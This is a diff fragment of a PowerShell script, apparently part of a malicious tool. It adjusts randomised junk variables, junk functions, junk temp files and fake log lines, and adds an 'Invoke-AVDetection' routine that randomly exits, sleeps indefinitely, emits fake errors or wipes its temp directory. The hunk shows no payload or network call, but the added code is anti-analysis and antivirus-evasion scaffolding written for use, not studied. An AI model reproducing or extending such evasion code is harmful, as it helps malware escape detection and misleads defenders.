@@ -531,17 +531,39 @@ for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
     Set-Content -Path $junkFile -Value $content -Encoding ASCII
 }
 
-for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 6); $i++) {
     $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
-    Set-Variable -Name $junkVar -Value ([guid]::NewGuid().ToString() + (Get-Random))
+    Set-Variable -Name $junkVar -Value ("JUNK" + [guid]::NewGuid().ToString() + (Get-Random))
 }
-for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
     $fname = "junkFunc" + [guid]::NewGuid().Guid.Substring(0,8)
-    Set-Item -Path "function:$fname" -Value { param($x) return $x * (Get-Random -Minimum 1 -Maximum 100) }
+    Set-Item -Path "function:$fname" -Value { param($x) return ($x + (Get-Random -Minimum 1 -Maximum 100)) }
 }
-for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
-    Write-Error ("Random error: " + [guid]::NewGuid().ToString())
-    Write-Output ("Random log: " + (Get-Random))
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
+    $junkFile = Join-Path $tempDir ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
+    Set-Content -Path $junkFile -Value ("JUNK" + [guid]::NewGuid().ToString()) -Encoding ASCII
+}
+
+if ((Get-Random) % 2 -eq 0) {
+    Write-Output ("Fake log: " + (Get-Date))
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
+}
+
+function Invoke-AVDetection {
+    $behaviors = @("exit", "sleep", "error", "cleanup", "noop")
+    $choice = $behaviors | Get-Random
+    switch ($choice) {
+        "exit"    { exit }
+        "sleep"   { while ($true) { Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 300) } }
+        "error"   { for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) { Write-Error "Fake critical error: $([guid]::NewGuid())"; Start-Sleep -Seconds 1 } }
+        "cleanup" {
+            try {
+                Get-ChildItem -Path $tempDir -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
+            } catch {}
+            exit
+        }
+        "noop" { Write-Output "No operation performed." }
+    }
 }
 
 try {
